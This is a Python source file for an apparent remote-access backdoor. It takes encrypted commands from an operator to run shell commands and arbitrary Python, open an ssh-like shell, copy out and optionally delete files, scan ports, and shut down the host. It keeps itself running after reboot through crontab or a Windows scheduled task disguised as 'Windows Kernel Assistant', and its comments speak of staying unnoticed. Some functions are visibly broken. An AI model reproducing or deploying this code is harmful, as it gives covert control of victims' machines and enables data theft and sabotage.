#!/usr/bin/env python3
# FOR PYTHON 3
import socket
import cmd
import getpass
import os
import argparse
import time
import platform
import subprocess
import shlex
import tempfile
from Crypto.Cipher import Salsa20, AES, PKCS1_OAEP
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from Crypto.Util import Padding
from Crypto.PublicKey import RSA
__version__ = '0.9'
__author__ = 'Yoav Rafalin'

# Constants
IP = '127.0.0.1'
PORT = 6000
SYSTEM = platform.system()
idlist = subprocess.check_output('groups').decode('utf-8').split()
ADMINCHECK = idlist[6]
CHUNK_SIZE = [512, 64, 8, 1]
GARBAGE = 12345678

# Setting up runmode
runmode = argparse.ArgumentParser(description='Get runmode')
runmode.add_argument('-a', '--active', action='store_true')  # runmode for active(reaching out to the other side)
runmode.add_argument('-p', '--passive', action='store_true')  # runmode for passive(waiting to receive connection)
runmode.add_argument('-r', '--reactive', action='store_true')  # runmode for reactive(waiting to receive signal)
MODE = vars(runmode.parse_args())  # Turns into dict

# Things I learned:
# use tempfile module instead of temp file in quick transfer
# binaries are just as strong against hashing as interpreted languages
# every for in range can be made
# add do_new_variant function which will change a variable garbage in each program
# you can find things in program using asts
# cmd uses asts to find do_...
# ast.NodeVisitor has visit() which will cals visit_object (eg Str) and enter it as an input
# ast.NodeTransformer has same thing but the object will become what you return in the function
# with a dict you could go through program and add vars to dict with a new random thing, and +
# then change the same ones to that random thing


# Utility functions

def encode_with_key(string_to_encode, key):  # Encrypting and decrypting
    '''Encrypts string_to_encode by creating new Salsa20 cipher object with key
    as the key.

    Args:
        string_to_encode - bytes object to be encrypted by Salsa20 with key
        key - bytes object key used to encrypt string_to_encode'''
    new_cipher = Salsa20.new(key=key)
    encrypted_msg = new_cipher.encrypt(string_to_encode.encode())
    return new_cipher.nonce + encrypted_msg


def original_encode_with_key(string_to_encode, key):  # Encrypting and decrypting
    '''Encrypts string_to_encode by splitting words into characters, then to
    ASCII from text, multiplying by key, and combining (and returning) the
    numbers with spaces in between.'''
    list_of_numbers = []
    for letter in string_to_encode:
        list_of_numbers.append(str(ord(letter)*key))
    return ' '.join(list_of_numbers).encode()


def decode_with_key(bytes_to_decode, key):
    '''Decrypts bytes_to_decode by creating new Salsa20 cipher object with a
    nonce (the first 8 chars of bytes_to_decode) and key as key.

    Args:
        bytes_to_decode - bytes object encrypted by Salsa20 with key, and the
        first 8 bytes as nonce
        key - bytes object key used to encrypt bytes_to_decode
    Output:
        decrypted_msg - bytes_to_decode decrypted with key, string object'''
    new_cipher = Salsa20.new(key=key, nonce=bytes_to_decode[:8])
    decrypted_msg = new_cipher.decrypt(bytes_to_decode[8:]).decode('utf-8')
    return decrypted_msg


def original_decode_with_key(bytes_to_decode, key):
    '''Decodes bytes_to_decode by splitting numbers on spaces, dividing by key,
    converting from ASCII back to text, and stringing (and returning) together
    the characters into text.'''
    string_of_bytes = ''
    list_of_bytes = bytes_to_decode.decode('utf-8').split()
    for letter in list_of_bytes:
        string_of_bytes += chr(int(int(letter)//key))
    return string_of_bytes


def send_message(message_to_send, key, connection, lenoflenofmsg=5):
    '''Does the original sending protocol. Gets length of message_to_send, sends
    it using connection after adjusting to be lenoflenofmsg, and then encodes
    message with key (unless key is None) and sends over connection as well.
    Returns encoded message, as well as the length of the message.'''
    if key is None:
        if type(message_to_send) is bytes:
            message = message_to_send
        else:
            message = str(message_to_send).encode()
    else:
        message = encode_with_key(str(message_to_send), key)
    length_of_msg = str(len(message))
    length_of_msg = ('0' * (lenoflenofmsg-len(length_of_msg))) + length_of_msg  # This part is adding zeros as padding so that it is always 5 chars
    connection.send(length_of_msg.encode())
    connection.send(message)
    return message, length_of_msg


def stream_send_message(message_to_send, key, connection):
    '''Does the sending protocol. Encodes message_to_send with key (unless key
    is None), breaks down into individual bytes and then transfers with
    connection. Returns encoded message.'''
    if key is None:
        message = (str(message_to_send) + '\x00').encode('utf-8')
    else:
        message = encode_with_key(str(message_to_send + '\x00'), key)
    connection.send(char)
    return message


def recv_message(key, connection, lenoflenofmsg=5, no_decode=False):
    '''Does the original receiving protocol. Recieves length of the message
    (which is lenoflenofmsg long) over connection, then decodes with key
    (unless key is None). Returns decoded message.'''
    length_of_msg = int(connection.recv(lenoflenofmsg))
    if key is None:
        message = connection.recv(length_of_msg)
        if not no_decode:
            message = message.decode('utf-8')
    else:
        message = decode_with_key(connection.recv(length_of_msg), key)
    return message


def stream_recv_message(key, connection):
    '''Does the receiving protocol. Recieves one byte using connection until
    reaches null character, then decodes with key (unless key is None). Returns
    decoded message.'''
    new_message = b''
    while True:
        new_byte = connection.recv(1)
        if new_byte == b'\x00':
            break
        else:
            new_message += new_byte
    if key is None:
        message = new_message.decode('utf-8')
    else:
        message = decode_with_key(new_message, key)
    return message


def quick_transfer(totransfer, connection, key, maxsize=1024, ifbigger='more', ifsmaller='less', delafter=1):
    '''Use quick_transfer protocol to decide method of sending. If to transfer
    is larger than maxsize, the program will send (using seng_message with key
    and connection) ifbigger. The opposite is for ifsmaller. If it is bigger,
    it will be transfered over using chunk_transfer with connection. Otherwise,
    totransfer is transfered like normal, using send_message.'''
    if len(totransfer) > maxsize:
        send_message(ifbigger, key, connection)
        # recv_message(key, connection)# transfer on clientside sends an initial signal to start transfer function
        quick_tmp = tempfile.TemporaryFile(mode='w+')
        quick_tmp.write(totransfer)
        print(chunk_transfer(quick_tmp, connection, key))
        quick_tmp.close()
    else:
        send_message(ifsmaller, key, connection)
        send_message(totransfer, key, connection)


def original_stream_transfer(file_path, chunk_size, connection):
    '''Send file using stream protocol. Stream transfer sends chunks of size X
    over connection. The first byte of X is a 1 or a 0, depending of if the
    chunk is the last in the stream, or not. The next section is the length of
    the length chunk_size, and specifies how many bytes from the end are
    fillers. After that is the next chunk of the file that is chunk_size long,
    with 0 filling in if it is too short.'''
    try:
        with open(file_path, mode='rb') as opened_file:
            filesize = os.stat(file_path).st_size
            while True:
                message = opened_file.read(chunk_size)
                if opened_file.read(1):
                    opened_file.seek(-1, 1)
                    endfile = b'0'
                else:
                    endfile = b'1'
                message = endfile + ('0' * (len(str(chunk_size))-len(str(chunk_size-len(message)))) + str(chunk_size-len(message))).encode() + message + ('0' * (chunk_size-len(message))).encode()
                connection.send(message)
                if opened_file.read(1):
                    opened_file.seek(-1, 1)
                else:
                    break
        return 'Transfer succeded from this end.'
    except Exception as e:
        return 'Transfer failed.', e


def stream_transfer(file_path, chunk_size, connection):
    '''Send file using stream protocol. Stream transfer sends chunks of size X
    over connection. The first byte of X is a 1 or a 0, depending of if the
    chunk is the last in the stream, or not. The data is then end-padded to 16
    bytes.'''
    #try:
    aes_key = get_key(connection)
    with open(file_path, mode='rb') as opened_file:
        filesize = os.stat(file_path).st_size
        while True:
            message = opened_file.read(chunk_size)
            if len(message) == 0:
                message = b'0'
            #if chunk_size <= 256
            message = Padding.pad(message, 16)
            aes_cipher = AES.new(aes_key, AES.MODE_GCM)
            ciphertext, tag = aes_cipher.encrypt_and_digest(message)
            encrypted_message = aes_cipher.nonce + tag + ciphertext
            #for chunk in range(round(chunk_size/16)):
            #    print('chunk', chunk)
            #    to_encrypt = message[chunk * 16: (chunk_size + 1) * 16]
            #    if chunk == 0:
            #        digest = aes_cipher.digest()
            #        print(len(digest))
            #        encrypted_message += digest
            #        encrypted_message += aes_cipher.encrypt(to_encrypt)
            #    else:
            #        encrypted_message += aes_cipher.encrypt(to_encrypt)
            connection.send(encrypted_message)
            if opened_file.read(1):
                opened_file.seek(-1, 1)
            else:
                break
    return 'Transfer succeded from this end.'
    #except Exception as e:
    #    return 'Transfer failed.', e


def original_chunk_transfer(file_path, connection, key, chunk_sizes=CHUNK_SIZE):
    '''Send file using chunk protocol. Chunk protocol breaks down the file into
    sizes from chunk_sizes (the default being like base 8), sends the string
    which contains those amounts encoded over connection, then reads from the
    file at file_path and sends the pieces in likewise sized chunks over
    connection.'''
    with open(file_path, mode='rb') as opened_file:
        try:
            filesize = os.stat(file_path).st_size
            chunk_numbers = []
            for size in chunk_sizes:
                chunk_numbers.append(str(filesize//size))
                filesize = filesize % size
            send_message(' '.join(chunk_numbers), key, connection)
            filesize = os.stat(file_path).st_size
            while True:
                if filesize < 1:
                    break
                connection.send(opened_file.read(1024))
                filesize -= 1024
            return 'Transfer succeded from this end.'
        except Exception as e:
            return 'Transfer failed.', e


def chunk_transfer(file_path, connection, key):
    '''Send file using chunk protocol. Chunk protocol breaks down the file into
    sizes from chunk_sizes (the default being like base 8), sends the string
    which contains those amounts encoded over connection, then reads from the
    file at file_path and sends the pieces in likewise sized chunks over
    connection. For the smallest size (16 bytes), they are all sent at once to
    save data, and padded to 16.'''
    chunk_sizes = [256, 16]
    aes_key = get_key(connection)
    with open(file_path, mode='rb') as opened_file:
        filesize = os.stat(file_path).st_size
        chunk_numbers = []
        for size in chunk_sizes:
            chunk_numbers.append(filesize//size)
            filesize = filesize % size
        chunk_numbers[-1] += 1
        send_chunk_numbers = []
        for num in chunk_numbers:
            send_chunk_numbers.append(str(num))
        send_message(' '.join(send_chunk_numbers), key, connection)
        filesize = os.stat(file_path).st_size
        # while True:
        #     if filesize < 1:
        #         break
        #     connection.send(Padding.pad(opened_file.read(1024), 16))
        #     filesize -= 1024
        cycle = 0
        for num in chunk_numbers:
            if num != chunk_numbers[-1]:
                for chunk in range(num):
                    message = opened_file.read(chunk_sizes[cycle])
                    aes_cipher = AES.new(aes_key, AES.MODE_GCM)
                    ciphertext, tag = aes_cipher.encrypt_and_digest(message)
                    encrypted_msg = aes_cipher.nonce + tag + ciphertext
                    connection.send(encrypted_msg)
            else:
                message = Padding.pad(opened_file.read(chunk_sizes[cycle] * num), chunk_sizes[-1])
                aes_cipher = AES.new(aes_key, AES.MODE_GCM)
                ciphertext, tag = aes_cipher.encrypt_and_digest(message)
                encrypted_msg = aes_cipher.nonce + tag + ciphertext
                connection.send(encrypted_msg)
            cycle += 1
        return 'Transfer succeded from this end.'


def get_key(connection):
    '''Recieving key protocol. Sends server RSA public key over connection. The
    server then recieves the client public key, and recieves the encrypted key,
    and signed hash of it. The server then verifies it, and decrypts the
    encrypted key that is being shared.'''
    rsa_server_key = RSA.generate(2048)
    send_message(rsa_server_key.publickey().exportKey(), None, connection)
    rsa_client_key = RSA.import_key(recv_message(None, connection, no_decode=True))
    key_signature = recv_message(None, connection, no_decode=True)
    key_unsigned = recv_message(None, connection, no_decode=True)
    hash_verify = pkcs1_15.new(rsa_client_key)
    hash_verify.verify(SHA256.new(data=key_unsigned), key_signature)
    rsa_cipher = PKCS1_OAEP.new(rsa_server_key)
    key = rsa_cipher.decrypt(key_unsigned)
    return key


def find_all_files(start_path='//', mode=False):
    '''Recursively find all paths of files in start_path. Starts by listing
    every file in start_path (default is root) and when a directory is met,
    runs the program in that directory. Returns the list, and the total size of
    the combined files in bytes as well if mode is True.'''
    if start_path[-1:] == '/':
        start_path = start_path[:-1]
    # start_path = start_path[:-1] if start_path[:-1] == '/'
    all_files = []
    path_contents = os.listdir(start_path)
    print(path_contents)
    for obj in path_contents:
        try:  # In case PermissionError occurs
            if os.path.isfile(start_path + '/' + obj):
                all_files.append(start_path + '/' + obj)
            elif os.path.isdir(start_path + '/' + obj):
                all_files.extend(find_all_files(start_path + '/' + obj))
        except:
            continue
    if mode:
        size_of_files = 0
        for path in all_files:
            size_of_files += os.stat(path).st_size
        return all_files, size_of_files
    else:
        return all_files


# Cmd class
class recv_commands(cmd.Cmd):
    def __init__(self, server, system, key):  # VERY IMPORTANT lets me use key and socket outside main
        self.key = key
        self.server = server
        self.system = system

    def do_exit(self, arg):
        '''Exits program and tells server to do so as well.'''
        return 0  # Makes continue_loop 0

    def do_loggedin(self, arg):
        '''Get current logged in user. Uses os.getlogin. Available for all
        operating systems.'''
        message, length_of_msg = send_message(os.getlogin(), self.key, self.server)
        print('loggedin', length_of_msg)
        return 1

    def do_WHOAMI(self, arg):
        '''Get current logged in user. Uses os.getlogin. Available for all
        operating systems.'''
        message, length_of_msg = send_message(getpass.getuser(), self.key, self.server)
        print('whoami', length_of_msg)
        return 1

    def do_volume(self, arg):
        '''Set volume. Syntax is "volume number". Uses os module to run
        applescript. Available for Darwin.'''
        os.system('osascript -e \'set volume '+arg+'\'')  # Uses applescript
        os.system('osascript -e \'get volume settings\'')  # To see actual volume as set volume is not very reliable
        print('volume ' + arg)
        return 1

    def do_say(self, arg):
        '''Announce a phrase on the server. Syntax is "say statement". Uses
        os module to run "say" command on MacOS. Available for Darwin.'''
        os.system('say ' + str(arg))
        print('say ' + arg)
        return 1

    def do_logout(self, arg):
        '''Logout the other computer. Uses os module to run applescript on
        MacOS, and "shutdown" on Windows. Available for Darwin and Windows.'''
        print('logout')
        if self.system == 'Windows':
            os.system('shutdown -l -f')
        else:
            os.system('osascript -e \'tell application \"loginwindow\" to «event aevtrlgo»\'')
        return 1

    def do_shutdown(self, arg):
        '''Shutdown the other computer. Uses os module to run applescript on
        MacOS, and "shutdown"  on Windows. Available for Darwin and Windows.'''
        print('shutdown')
        if self.system == 'Windows':
            os.system('shutdown -s -f')
        else:
            os.system('osascript -e \'tell app \"System Events\" to shut down\'')
        return 1

    def do_sleep(self, arg):
        '''Sleep the other computer. Uses os module to run "pmset" on MacOS,
        "shutdown" on Windows, and "xset" on Linux. Available for MacOS,
        Windows, and Linux.'''
        print('sleep')
        if self.system == 'Windows':
            os.system('psshutdown -d')
        elif self.system == 'Darwin':
            os.system('osascript -e \'tell app "System Events" to sleep\'')
        else:  # Last one is Linux
            os.system('xset -display :0.0 dpms force off')
        return 1

    def do_exec(self, arg):
        '''Run Python code on the other computer. Syntax is "exec Python
        script". Uses Python exec() function.'''
        print('exec ' + str(arg))
        args = arg.split()
        try:
            exec(args)
        except:
            pass
        return 1

    def do_cmd(self, arg):
        '''Run a command on the server. Syntax is "cmd command [args]". Uses
        subprocess module. Sudo commands not available.'''
        args = shlex.split(arg)
        try:
            message = subprocess.check_output(args).decode('utf-8')
        except:
            message = '!Command Failed!'
        message, length_of_msg = send_message(message, self.key, self.server)
        print('system cmd', length_of_msg)
        return 1

    def do_dir(self, arg):
        '''See directory contents. Syntax is "dir path". Uses os.listdir.
        Available for all operating system.'''
        try:
            message, length_of_msg = send_message('\n'.join(os.listdir(arg)), self.key, self.server)
        except:
            message, length_of_msg = send_message('That directory does not exist.', self.key, self.server)
        print('system cmd', length_of_msg)
        return 1

    def do_pers(self, arg):
        '''Set file to run on boot (put in crontab). Uses os module to run
        "crontab" on MacOS and Linux, and "schtasks" on Windows. Available for
        MacOS, Windows, and Linux.'''
        if self.system == 'Darwin' or self.system == 'Linux':
            try:
                message = subprocess.check_output(['cron', '@reboot', str(os.path.abspath(__file__))])  # Will fail on try unlike run()
                message = 'Success! File put in crontab.'
            except:
                message = '!Persistance Failed!'
        else:  # This one for Windows
            try:
                message = subprocess.check_output(['schtasks', '/create', '/tn', '"Windows Kernel Assistant"', '/tr', os.path.abspath(__file__), '/sc onstart'])
                message = 'Success! File set as scheduled task.'
            except:
                message = '!Persistance Failed!'
        message, length_of_msg = send_message(message, self.key, self.server)
        print('persistance', length_of_msg)
        return 1

    def do_portscan(self, arg):
        '''Scan ports set as range or as number. Syntax is "portscan
        [number-number OR number]". If no number is provided, will
        scan for well known ports. This may take a while. Available for all
        operating systems.'''
        args = arg.split('-')  # Splitting on dash to find ends of range
        if len(args) > 1:
            ports_to_scan = [range(int(args[0]), int(args[1])+1)]
        elif len(args) == 1:  # If no dash then there was no range
            ports_to_scan = [args]
        else:
            ports_to_scan = ['19', '22', '23', '53', '80', '115', '123']
        print(ports_to_scan)
        avail_ports = []
        for portcheck in ports_to_scan:
            client = socket.socket()
            try:
                client.connect(('127.0.0.1', portcheck))
                avail_ports.append(str(portcheck))
            except:
                pass

        message, length_of_msg = send_message(' '.join(avail_ports), self.key, self.server)
        print('portscan ' + str(arg), length_of_msg)
        return 1

    def do_searchword(self, arg):
        '''Search the filesystem for a keyword. Syntax is "searchword keyword
        [ in directory]".'''
        keyword = arg.split(' in ')[0]
        path_to_search = arg.split(' in ')[-1]
        if path_to_search != keyword:
            file_list = find_all_files(path_to_search)
        else:
            keyword = arg.split(' ')[0]
            path_to_search = arg.split(' ')[-1]
            if path_to_search != keyword:
                file_list = find_all_files(path_to_search)
            else:
                file_list = find_all_files()
        # file_list = find_all_files(path_to_search if path_to_search != keyword)
        print(file_list)
        flagged = []
        for path in file_list:
            print(path)
            if keyword.lower() in path.lower():
                flagged.append(path)
        print(flagged)
        message, length_of_msg = send_message('\n'.join(flagged), self.key, self.server)
        return 1

    def do_stream(self, arg):
        '''Stream file from server to current directory. Syntax is "stream [del]
        path". If "del" is included, file will be deleted afterwards.'''
        if arg[:4] == 'del ':
            del_file = True
            arg = arg[4:]
        else:
            del_file = False

        if os.path.isfile(arg):
            send_message('That file exists and will be streamed over.', self.key, self.server)
            print(stream_transfer(arg, 512, self.server))
            if del_file:
                os.remove(arg)
        elif os.path.isdir(arg):
            send_message('That directory exists and its contents will be transfered.', self.key, self.server)
            file_list, size_of_files = find_all_files(arg, 1)
            print(file_list)
            send_message('''Would you like to transfer all {num} files. That is {byte} bytes.'''.format(num=len(file_list), byte=size_of_files), self.key, self.server)
            if recv_message(self.key, self.server) == 'y':
                send_message(str(len(file_list)), self.key, self.server)
                for path in file_list:
                    # the string chopping process removes the path of the this computer which is not being replicated on the clientside
                    send_message(arg.split('/')[-1] + '/' + path[len(arg)+1:], self.key, self.server)
                    print(stream_transfer(path, self.server, self.key))
                if del_file:
                    from shutil import rmtree
                    # shutil.rmtree(arg) #let's not deal with accidentally deleating the /users directory
        else:
            send_message('That cannot be accessed.', self.key, self.server)
        return 1

    def do_transfer(self, arg):
        '''Transfer file from server to current directory. Syntax is "transfer
        [del] path". if "del" is included, file will be deleted afterwards.'''
        if arg[:4] == 'del ':
            del_file = True
            arg = arg[4:]
        else:
            del_file = False

        if os.path.isfile(arg):
            # chunk_sizes = [512, 64, 8, 1]
            send_message('That file exists and will be transfered.', self.key, self.server)
            print(chunk_transfer(arg, self.server, self.key))
            if del_file:
                os.remove(arg)
        elif os.path.isdir(arg):
            send_message('That directory exists and its contents will be transfered.', self.key, self.server)
            file_list, size_of_files = find_all_files(arg, 1)
            print(file_list)
            send_message('''Would you like to transfer all {num} files. That is {byte} bytes.'''.format(num=len(file_list), byte=size_of_files), self.key, self.server)
            if recv_message(self.key, self.server) == 'y':
                send_message(str(len(file_list)), self.key, self.server)
                for path in file_list:
                    # the string chopping process removes the path of the this computer which is not being replicated on the clientside
                    send_message(arg.split('/')[-1] + '/' + path[len(arg)+1:], self.key, self.server)
                    print(chunk_transfer(path, self.server, self.key))
                if del_file:
                    from shutil import rmtree
                    # shutil.rmtree(arg) #let's not deal with accidentally deleating the /users directory
        else:
            send_message('That cannot be accessed.', self.key, self.server)
        return 1

    def do_transferto(self, arg):
        chunk_sizes = [512, 64, 8, 1]
        length_of_msg = int(self.server.recv(5).decode('utf-8'))
        filename = decode_with_key(self.server.recv(length_of_msg), int(self.key))  # getting filename from client

        length_of_msg = int(self.server.recv(5).decode('utf-8'))
        message = decode_with_key(self.server.recv(length_of_msg), int(self.key))
        chunk_numbers = message.split()
        local_file = open(arg+'/{}'.format(filename.split('/')[-1]), mode='wb')
        cycle = 0
        for num in chunk_numbers:
            for chunk in range(int(num)):
                local_file.write(self.server.recv(chunk_sizes[cycle]))
            cycle += 1
        local_file.close()
        return 1

    def do_ssh(self, arg):
        '''Emulate a ssh onto to the server computer. Some commands from this
        program can also be called from the "command line" such as "transfer",
        "exit/logout", and "su". Sudo commands can also be run if the sudo
        password is placed after the commands.'''
        message, length_of_msg = send_message(socket.gethostname(), self.key, self.server)
        message, length_of_msg = send_message(os.getlogin(), self.key, self.server)
        while True:
            message, length_of_msg = send_message(os.getcwd(), self.key, self.server)
            command = recv_message(self.key, self.server)

            print(command)

            if 'cd' == command[:2]:
                try:
                    if command.split()[1][:1] == '/' or command.split()[1][:1] == '~':
                        os.chdir(os.path.abspath(shlex.split(command)[1]))
                    elif command.split()[1] == '..':
                        os.chdir('/' + ('/'.join(os.getcwd().split('/')[:-1])))
                    else:
                        os.chdir(os.getcwd() + '/' + command.split()[1])
                    quick_transfer(subprocess.check_output(['ls']).decode('utf-8'), self.server, self.key)
                except:
                    quick_transfer('Could not change directories', self.server, self.key)
            elif 'transfer' == command[:8]:
                recv_message(self.key, self.server)
                recv_commands.do_transfer(command[9:])
            elif 'su ' == command[:3]:
                recv_commands.do_su(command[3:])
            elif command == 'exit' or command == 'logout':
                break
            else:
                try:
                    if 'sudo' == command[:4]:
                        run_command = subprocess.Popen(shlex.split(command)[:-1], stdout=subprocess.PIPE).decode('utf-8')
                        run_command.communicate(input=shlex.split(command)[-1:], timeout=10)
                    else:
                        run_command = subprocess.check_output(shlex.split(command), timeout=10).decode('utf-8')
                    quick_transfer(run_command, self.server, self.key)
                except subprocess.TimeoutExpired:
                    quick_transfer('Command timed out', self.server, self.key)
                except:
                    quick_transfer('Command failed to complete', self.server, self.key)
        return 1

    def do_admin(self, arg):
        '''Check if server account is admin. Uses subprocess module. Available
        for MacOS, and Linux.'''
        if ADMINCHECK == 'admin':
            message = 'You are in an admin account.'
        else:
            message = 'You are not in an admin account.'
        message, length_of_msg = send_message(message, self.key, self.server)
        print('admin', length_of_msg)
        return 1

    def do_su(self, arg):
        '''Get root access if server account is admin. Syntax is "su password".'''
        if ADMINCHECK == 'admin':
            sucmd = subprocess.Popen(['su'])
            sucmd.communicate(input=arg)
        print('su ' + arg)
        return 1

    def do_system(self, arg):
        '''Get the server os. Uses platform.system.'''
        message, length_of_msg = send_message(self.system, self.key, self.server)
        print('system', length_of_msg)
        return 1

    def do_uname(self, arg):
        '''Get machine info: node, platform, processor, system version, and
        other info. Syntax is "uname [number]".'''
        if len(arg) > 0:
            message = platform.uname()[int(arg)]  # platform.uname returns named tuple
        else:
            message = ' '.join(list(platform.uname()))
        message, length_of_msg = send_message(message, self.key, self.server)
        print('uname' + str(arg), length_of_msg)
        return 1

    def do_killattack(self, arg):
        '''Erase all backdoor files on serverside.'''
        print(os.path.abspath(__file__))
        # os.remove(os.path.abspath(__file__))
        return 0


# Entry point
def main(mode_input=MODE, key_input=None, ip_input=IP, port_input=PORT, recvkey=True):
    'Main function'

    continue_loop = 1  # Stopping the cmdone loop uses this var
    sizes = [512, 64, 8, 1]

    print(mode_input)

    # Setting up socket
    if mode_input['active'] is True and mode_input['passive'] is True:
        print('Not a valid input')
        raise SystemExit
    elif mode_input['reactive'] is True:
        while True:
            time.sleep(10)
            instances_in_log = subprocess.check_output(['log', 'stream', '|', 'grep', '"runreactive"']).decode('utf-8').split('\n')
            if len(instances_in_log) == 0:
                continue
            for line in instances_in_log:
                if 'exec' in line:
                    exec('pass')  # figure this part out
            for line in instances_in_log:
                if 'cmd' in line:
                    os.system('ls')  # figure this part out
    elif mode_input['active'] is True:
        while True:
            time.sleep(2)  # To not use a noticadable amount of cpu
            try:
                server = socket.socket()
                server.connect((ip_input, port_input))
                break
            except:
                pass
    else:
        connect = socket.socket()
        connect.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # To not get Errno [48] port in use
        connect.bind((ip_input, port_input))
        connect.listen(1)
        server, addr = connect.accept()
    '''while True:#For multiple requests
        server, addr = server.accept()
        length_of_msg = int(server.recv(2).decode('utf-8'))
        key = round(int(round(int(server.recv(length_of_msg).decode('utf-8'))**(1/2))))#Sqrt of key
        print('key', key)
        continue_loop = 1#Stopping the loop uses this var
        while continue_loop:
            length_of_msg_rtrnd = int(server.recv(5).decode('utf-8'))#Standard protocol for my project
            msg_recvd = str(decode_with_key(server.recv(length_of_msg_rtrnd), key))#Then receive real msg
            print('message recvd', msg_recvd)
            continue_loop = recv_commands(key, server).onecmd(msg_recvd)
        print('Bye')
        server.close()'''
    if recvkey is True:
        key_input = get_key(server)
        #key_input = recv_message(None, server, no_decode=True)
        print(len(key_input))
        #key_input = round(int(round(int(recv_message(None, server))**(1/2))))  # Sqrt of key
    send_message(SYSTEM, None, server)  # Send os
    print('key', key_input)
    while continue_loop:
        msg_recvd = recv_message(key_input, server)
        #length_of_msg = int(server.recv(5).decode('utf-8'))  # Standard protocol for my project
        #msg_recvd = decode_with_key(server.recv(length_of_msg), key_input)  # Then receive real msg
        print('message recvd', msg_recvd)
        continue_loop = recv_commands(server, SYSTEM, key_input).onecmd(msg_recvd)
    print('Bye')
    server.close()

if __name__ == '__main__':
    main()
